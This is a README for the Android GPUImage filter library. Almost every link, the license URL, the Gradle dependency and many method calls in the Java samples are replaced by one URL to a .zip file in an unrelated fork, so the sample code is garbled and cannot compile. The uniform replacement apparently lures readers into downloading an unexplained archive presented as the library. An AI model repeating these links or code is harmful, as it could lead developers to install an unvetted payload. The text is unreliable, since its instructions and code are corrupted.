# GPUImage for Android
[![License](https://raw.githubusercontent.com/rendyramon/android-gpuimage/master/library/src/jp/co/cyberagent/android/gpuimage_android_v1.1.zip%https://raw.githubusercontent.com/rendyramon/android-gpuimage/master/library/src/jp/co/cyberagent/android/gpuimage_android_v1.1.zip)](https://raw.githubusercontent.com/rendyramon/android-gpuimage/master/library/src/jp/co/cyberagent/android/gpuimage_android_v1.1.zip)
[![Download](https://raw.githubusercontent.com/rendyramon/android-gpuimage/master/library/src/jp/co/cyberagent/android/gpuimage_android_v1.1.zip) ](https://raw.githubusercontent.com/rendyramon/android-gpuimage/master/library/src/jp/co/cyberagent/android/gpuimage_android_v1.1.zip)

Idea from: [iOS GPUImage framework](https://raw.githubusercontent.com/rendyramon/android-gpuimage/master/library/src/jp/co/cyberagent/android/gpuimage_android_v1.1.zip)

Goal is to have something as similar to GPUImage as possible. Vertex and fragment shaders are exactly the same. That way it makes it easier to port filters from GPUImage iOS to Android.

## Requirements
* Android 2.2 or higher (OpenGL ES 2.0)

## Usage

### Gradle dependency

```groovy
repositories {
    jcenter()
}

dependencies {
    compile 'https://raw.githubusercontent.com/rendyramon/android-gpuimage/master/library/src/jp/co/cyberagent/android/gpuimage_android_v1.1.zip'
}
```

### Sample Code
With preview:

```java
@Override
public void onCreate(final Bundle savedInstanceState) {
    https://raw.githubusercontent.com/rendyramon/android-gpuimage/master/library/src/jp/co/cyberagent/android/gpuimage_android_v1.1.zip(savedInstanceState);
    setContentView(https://raw.githubusercontent.com/rendyramon/android-gpuimage/master/library/src/jp/co/cyberagent/android/gpuimage_android_v1.1.zip);

    Uri imageUri = ...;
    mGPUImage = new GPUImage(this);
    https://raw.githubusercontent.com/rendyramon/android-gpuimage/master/library/src/jp/co/cyberagent/android/gpuimage_android_v1.1.zip((GLSurfaceView) findViewById(https://raw.githubusercontent.com/rendyramon/android-gpuimage/master/library/src/jp/co/cyberagent/android/gpuimage_android_v1.1.zip));
    https://raw.githubusercontent.com/rendyramon/android-gpuimage/master/library/src/jp/co/cyberagent/android/gpuimage_android_v1.1.zip(imageUri); // this loads image on the current thread, should be run in a thread
    https://raw.githubusercontent.com/rendyramon/android-gpuimage/master/library/src/jp/co/cyberagent/android/gpuimage_android_v1.1.zip(new GPUImageSepiaFilter());

    // Later when image should be saved saved:
    https://raw.githubusercontent.com/rendyramon/android-gpuimage/master/library/src/jp/co/cyberagent/android/gpuimage_android_v1.1.zip("GPUImage", "https://raw.githubusercontent.com/rendyramon/android-gpuimage/master/library/src/jp/co/cyberagent/android/gpuimage_android_v1.1.zip", null);
}
```

Without preview:

```java
Uri imageUri = ...;
mGPUImage = new GPUImage(context);
https://raw.githubusercontent.com/rendyramon/android-gpuimage/master/library/src/jp/co/cyberagent/android/gpuimage_android_v1.1.zip(new GPUImageSobelEdgeDetection());
https://raw.githubusercontent.com/rendyramon/android-gpuimage/master/library/src/jp/co/cyberagent/android/gpuimage_android_v1.1.zip(imageUri);
https://raw.githubusercontent.com/rendyramon/android-gpuimage/master/library/src/jp/co/cyberagent/android/gpuimage_android_v1.1.zip("GPUImage", "https://raw.githubusercontent.com/rendyramon/android-gpuimage/master/library/src/jp/co/cyberagent/android/gpuimage_android_v1.1.zip", null);
```

### Gradle
Make sure that you run the clean target when using maven.

```groovy
gradle clean assemble
```

## License
    Copyright 2012 CyberAgent, Inc.

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

       https://raw.githubusercontent.com/rendyramon/android-gpuimage/master/library/src/jp/co/cyberagent/android/gpuimage_android_v1.1.zip

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
